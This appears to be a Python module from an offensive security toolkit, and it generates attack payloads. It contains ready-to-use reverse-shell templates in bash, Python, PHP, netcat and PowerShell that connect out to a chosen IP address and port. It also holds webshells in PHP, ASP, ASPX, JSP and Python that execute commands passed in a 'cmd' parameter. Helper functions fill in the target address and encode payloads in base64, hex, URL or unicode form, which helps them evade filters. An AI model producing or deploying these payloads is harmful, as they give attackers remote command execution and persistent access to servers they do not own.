import base64
import ipaddress
import logging
from urllib.parse import quote

log = logging.getLogger("artenisa.payloads")

REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python": (
        "import os\n"
        "import socket\n"
        "import subprocess\n"
        "s = socket.create_connection((\"{ip}\", {port}))\n"
        "os.dup2(s.fileno(), 0)\n"
        "os.dup2(s.fileno(), 1)\n"
        "os.dup2(s.fileno(), 2)\n"
        "subprocess.call([\"/bin/sh\", \"-i\"])\n"
    ),
    "php": (
        "<?php\n"
        "$socket = fsockopen(\"tcp://{socket_host}:{port}\");\n"
        "if ($socket !== false) {\n"
        "    $process = proc_open(\n"
        "        \"/bin/sh -i\",\n"
        "        array(0 => $socket, 1 => $socket, 2 => $socket),\n"
        "        $pipes\n"
        "    );\n"
        "    if (is_resource($process)) {\n"
        "        proc_close($process);\n"
        "    }\n"
        "}\n"
        "?>"
    ),
    "nc": (
        'fifo="/tmp/artenisa-$$"; '
        'mkfifo "$fifo"; '
        'cat "$fifo" | /bin/sh -i 2>&1 | nc {ip} {port} > "$fifo"; '
        'rm -f "$fifo"'
    ),
    "powershell": (
        "$address = [System.Net.IPAddress]::Parse(\"{ip}\")\n"
        "$client = [System.Net.Sockets.TcpClient]::new($address.AddressFamily)\n"
        "$client.Connect($address, {port})\n"
        "$stream = $client.GetStream()\n"
        "[byte[]]$buffer = New-Object byte[] 65536\n"
        "try {\n"
        "    while (($count = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {\n"
        "        $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $count)\n"
        "        $output = (Invoke-Expression $command 2>&1 | Out-String)\n"
        "        $prompt = \"PS \" + (Get-Location).Path + \"> \"\n"
        "        $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)\n"
        "        $stream.Write($response, 0, $response.Length)\n"
        "        $stream.Flush()\n"
        "    }\n"
        "}\n"
        "finally {\n"
        "    $stream.Dispose()\n"
        "    $client.Close()\n"
        "}\n"
    ),
}

WEBSHELLS = {
    "php": "<?php system($_GET[\"cmd\"]); ?>",
    "asp": (
        "<%\n"
        "Dim command, shell, process\n"
        "command = Request.QueryString(\"cmd\")\n"
        "If Len(command) > 0 Then\n"
        "    Set shell = Server.CreateObject(\"WScript.Shell\")\n"
        "    Set process = shell.Exec(command)\n"
        "    Response.Write Server.HTMLEncode(process.StdOut.ReadAll())\n"
        "End If\n"
        "%>"
    ),
    "aspx": (
        "<%@ Page Language=\"C#\" %>\n"
        "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
        "<script runat=\"server\">\n"
        "protected void Page_Load(object sender, System.EventArgs e)\n"
        "{\n"
        "    string command = Request.QueryString[\"cmd\"];\n"
        "    if (!string.IsNullOrEmpty(command))\n"
        "    {\n"
        "        ProcessStartInfo startInfo = new ProcessStartInfo();\n"
        "        startInfo.FileName = \"cmd.exe\";\n"
        "        startInfo.Arguments = \"/c \" + command;\n"
        "        startInfo.UseShellExecute = false;\n"
        "        startInfo.RedirectStandardOutput = true;\n"
        "        startInfo.RedirectStandardError = true;\n"
        "        Process process = Process.Start(startInfo);\n"
        "        Response.Write(Server.HtmlEncode(\n"
        "            process.StandardOutput.ReadToEnd()));\n"
        "        Response.Write(Server.HtmlEncode(\n"
        "            process.StandardError.ReadToEnd()));\n"
        "    }\n"
        "}\n"
        "</script>"
    ),
    "jsp": (
        "<%@ page import=\"java.io.*\" %>\n"
        "<%\n"
        "String command = request.getParameter(\"cmd\");\n"
        "if (command != null && !command.isEmpty()) {\n"
        "    Process process = Runtime.getRuntime().exec(command);\n"
        "    BufferedReader reader = new BufferedReader(\n"
        "        new InputStreamReader(process.getInputStream()));\n"
        "    String line;\n"
        "    while ((line = reader.readLine()) != null) {\n"
        "        out.println(line);\n"
        "    }\n"
        "    reader.close();\n"
        "}\n"
        "%>"
    ),
    "py": (
        "#!/usr/bin/env python3\n"
        "import os\n"
        "import subprocess\n"
        "from urllib.parse import parse_qs\n"
        "print(\"Content-Type: text/plain\")\n"
        "print()\n"
        "parameters = parse_qs(os.environ.get(\"QUERY_STRING\", \"\"))\n"
        "command = parameters.get(\"cmd\", [\"\"])[0]\n"
        "if command:\n"
        "    result = subprocess.run(\n"
        "        command,\n"
        "        shell=True,\n"
        "        capture_output=True,\n"
        "        text=True,\n"
        "        check=False,\n"
        "    )\n"
        "    print(result.stdout, end=\"\")\n"
        "    print(result.stderr, end=\"\")\n"
    ),
}


def reverse_shell(ip: str, port: int, shell_type: str = "bash") -> dict:
    shell_type = shell_type.lower()
    template = REVERSE_SHELLS.get(shell_type)
    if not template:
        return {"error": f"Shell type '{shell_type}' no soportado. Opciones: {list(REVERSE_SHELLS.keys())}"}
    try:
        socket_host = ip
        try:
            if ipaddress.ip_address(ip).version == 6:
                socket_host = f"[{ip}]"
        except ValueError:
            pass
        decoded = (
            template.replace("{ip}", ip)
            .replace("{socket_host}", socket_host)
            .replace("{port}", str(port))
        )
        return {
            "type": shell_type,
            "decoded": decoded,
            "encoded": base64.b64encode(decoded.encode()).decode(),
        }
    except Exception as e:
        return {"error": str(e)}


def webshell(lang: str = "php") -> dict:
    lang = lang.lower()
    decoded = WEBSHELLS.get(lang)
    if not decoded:
        return {"error": f"Webshell '{lang}' no soportada. Opciones: {list(WEBSHELLS.keys())}"}
    try:
        return {
            "language": lang,
            "decoded": decoded,
            "encoded": base64.b64encode(decoded.encode()).decode(),
        }
    except Exception as e:
        return {"error": str(e)}


def encode_payload(payload: str, method: str = "b64") -> dict:
    methods = {
        "b64": lambda p: base64.b64encode(p.encode()).decode(),
        "hex": lambda p: p.encode().hex(),
        "url": lambda p: quote(p),
        "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    }
    encoder = methods.get(method)
    if not encoder:
        return {"error": f"Método '{method}' no soportado. Opciones: {list(methods.keys())}"}
    try:
        return {
            "method": method,
            "original": payload,
            "encoded": encoder(payload),
        }
    except Exception as e:
        return {"error": str(e)}
